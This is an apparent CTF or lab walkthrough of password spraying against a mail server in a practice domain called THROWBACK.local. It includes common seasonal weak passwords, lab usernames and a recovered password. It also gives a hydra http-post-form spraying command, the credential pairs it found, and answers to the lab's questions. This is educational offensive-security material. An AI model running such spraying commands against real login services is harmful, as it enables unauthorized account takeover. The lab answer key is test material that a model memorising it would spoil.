# Wait, just you mean just one this time?

- The only service we have left to attack is the mail server (10.200.53.232)
- Your team has suggested that you try password spray using the contact list from guest accounts as well as send phishing emails to the user in the contact list.


## What is password spraying?
- Password spraying is an attack where the password is constant and we are throwing a bunch of usernames from a list to see if any of them have that password set.
- This usually happens when users have default passwords set or a common weak password as well.
	- You can easily test in an environment for weak passwords by spraying a list of passwords/password against a list of users.

Brute-forcing is of many types, but mostly it is attempting a large number of passwords on the smallest number of accounts, or even on a single account.

On the other hand, Password spraying is almost the opposite. It is attempting the smallest number of passwords on the biggest number of accounts possible.

Reference - [Owasp Password Attacks](https://owasp.org/www-community/attacks/Password_Spraying_Attack)

## Common weak passwords
- If there are no strong password policies set in that environment, then we can spray the passwords or default passwords against a set of usernames.

Some examples of common weak passwords would be the current season with current year.

```
	 Summer2020

    Management2020

    Management2018

    Password2020

    <company>2020

    Password123
```

So first thing we need to do is build a list of usernames, since we remember that we got a list of bunch of usernames and their emails of THROWBACK.local domain from the mail server using guest account.
![[Pasted image 20220926054030.png]]

So list of usernames can be
```
HumphreyW
SummersW
FoxxR
DaibaN
PeanutButterM
PetersJ
DaviesJ
BlaireJ
GongoH
MurphyF
JeffersD
HorsemanB
```
[Some other usernames](https://github.com/insidetrust/statistically-likely-usernames)

Now for passwords we can compile a list as well, by mostly guessing and using same passwords again and again which were found previously.
- We found the password for HumphreyW as `securitycenter` which was an NTLM hash found in one of the log files on the firewall server.

```
Fall2020
Summer2020
Fall2019
Autumn2020
Autumn2019
Winter2020
Winter2019
Summer2021
Summer2022
Management2019
Management2018
Management2020
ThrowbackHacks2020
ThrowbackHacks2019
Throwback2019
Throwback2020
securitycenter
Password123
Password
```

- Now we need a password spraying tool!
1. BurpSuite - using ClusterBomb Intruder attack
2. Hydra 
```shell
#Using hydra, use the following command

hydra -L users.txt -p <password> MACHINE_IP http-post-form '/src/redirect.php:<user_parameter>=^USER^&<pass_parameter>=^PASS^:F=incorrect' -v

#In place of <user_parameter>, use the parameter name displayed while intercepting the request and same goes for <pass_parameter>
#If we want to use a file with passwords then we can use capital P (-P)
```

Some of the valid usernames and passwords we got were:
```
PeanutButterM : Summer2020
GongoH : Summer2020
JeffersD : Summer2020
MurphyF : Summer2020
DaviesJ : Management2018
```
- We can login using these creds and see for something sensitive on mails of employees as well

Check for Results in `"Secrets Harvested"` Folder above


## Questions
1. What is the username parameter in the POST request?
`Check Request in Proxy and the answer will be login_username.`

2. What is the password parameter in the POST request?
`secretkey`

3. What username found with hydra starts with an M?
`MurphyF`

4. What is the password found with hydra?
`Summer2020`


### Note - Password Spraying Attacks on HTTP require Burp or Hydra.
- SMB, LDAP, ssh and winrm can be password sprayed using crackmapexec
- Kerberos Auth can be password sprayed using Kerbrute

For HTTP POST parameter password spraying, hydra is faster if supplied with one password at a time. So use that if time constraint.